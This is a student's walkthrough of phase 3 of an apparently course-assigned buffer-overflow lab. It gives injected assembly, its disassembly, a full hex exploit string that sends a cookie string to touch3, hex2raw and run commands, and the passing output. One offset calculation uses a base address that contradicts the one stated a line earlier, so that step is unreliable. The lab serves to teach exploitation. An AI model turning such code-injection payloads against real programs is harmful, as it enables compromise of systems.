#Phase 3

Phase 3 similar to phase2 except we are trying to call the function touch3 and have to pass our cookie to it as string.

In the instruction it tells you that if you store the cookie in the buffer allocated for getbuf, the functions hexmatch and strncmp
may overwrite it as they will be pushing data on to the stack, so you have to be careful where you store it.

So let's pass the address for the cookie to register $rdi

The total bytes before the cookie are `buffer + 8 bytes for return address of rsp + 8 bytes for touch3` 

`0x28 + 0x8 + 0x8 =  0x38` (56 Decimal)  

Grab the address for rsp from phase 2: `0x5567e588`
Add 0x38

`0x55620cd8 + 0x38 = 0x5567E5C0`

Now we need this assembly code, we can write our assembly code in phase3.s and dissassemble it using the same code as phase2:
My assembly code looks like this:

```
movq $0x5567E5C0,%rdi
pushq $0x4019c6
retq

```
I dissasembled it using:

```
gcc -c phase3.s
objdump -d phase3.o  > phase3.d 
```

The byte representation is as follows:
```
Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 c0 e5 67 55 	mov    $0x5567e5c0,%rdi
   7:	68 c6 19 40 00       	pushq  $0x4019c6
   c:	c3                   	retq   

```

Now, grab the bytes from the above code and start constructing your exploit string. Create a new file named phase3.txt and here is what mine looks like:
```
48 c7 c7 c0 e5 67 55 68 /*rsp + 0x38 the address where the cookie is present*/
c6 19 40 00 c3 00 00 00 /*Pushed the adress of touch3*/
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /*Padding of the buffer*/
00 00 00 00 00 00 00 00
88 e5 67 55 00 00 00 00 /*the return adress of rsp*/
c6 19 40 00 00 00 00 00 /*touch3 adress*/
32 64 32 37 34 33 37 38 /*My cookie to string*/

```
The last row is the cookie converted to text, to do this go to http://www.unit-conversion.info/texttools/hexadecimal/ and put in your cookie without '0x'.
Copy that into the last row.

Last step is to generate the raw eploit string using the hex2raw program.

`./hex2raw < phase3.txt > raw-phase3.txt`

Finally, you run the raw file

`./ctarget < raw-phase3.txt`

It should give you something like this:

```
Cookie: 0x2d274378
Type string:Touch3!: You called touch3("2d274378")
Valid solution for level 3 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!

```
